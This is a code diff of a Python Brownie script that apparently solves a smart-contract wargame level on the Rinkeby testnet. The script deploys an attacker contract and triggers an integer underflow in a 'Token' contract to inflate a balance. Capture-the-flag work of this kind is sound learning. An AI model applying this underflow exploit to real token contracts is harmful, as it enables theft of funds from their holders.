@@ -3,7 +3,7 @@ from brownie import accounts, Token, TokenAttacker
 # load account
 account = accounts.load("Rinkeby_Test_Net_Account")
 # get instance
-instance_address = "0x8f71F13C6FCaD64825549bf0BD57E0bb7768C02A"
+instance_address = "0xF4b2D87f6483806cF4044FFF650e5f8c1EbE3a46"
 token = Token.at(instance_address)
 
 # ------------------------------------------------------------------------
@@ -27,7 +27,9 @@ def exploit():
 
     # we can cause an interger underflow with our hacker contract
     tx = hacker.attack(
-        account.address, 1000, {"from": account, "gas_limit": 1e6, "allow_revert": True}
+        account.address,
+        1000,
+        {"from": account, "gas_limit": 1e6, "allow_revert": True},
     )
     tx.wait(1)
 
@@ -38,16 +40,16 @@ def exploit():
     print(f"Hacker contract balance: {token.balanceOf(hacker.address)}")
 
     # transfer half of our hacker contract balance to ourselves (this is extra)
-    hacker_balance = int(token.balanceOf(hacker.address) / 2)
-    tx = hacker.attack(
-        account.address,
-        hacker_balance,
-        {"from": account, "gas_limit": 1e6, "allow_revert": True},
-    )
-    tx.wait(1)
+    # hacker_balance = int(token.balanceOf(hacker.address) / 2)
+    # tx = hacker.attack(
+    #     account.address,
+    #     hacker_balance,
+    #     {"from": account, "gas_limit": 1e6, "allow_revert": True},
+    # )
+    # tx.wait(1)
 
-    # check our final balance (again, this is overkill)
-    print(f"Our final token balance: {token.balanceOf(account.address)}")
+    # # check our final balance (again, this is overkill)
+    # print(f"Our final token balance: {token.balanceOf(account.address)}")
 
     # confirm we have completed the level
     print(f"Level has been completed: {level_completed()}")
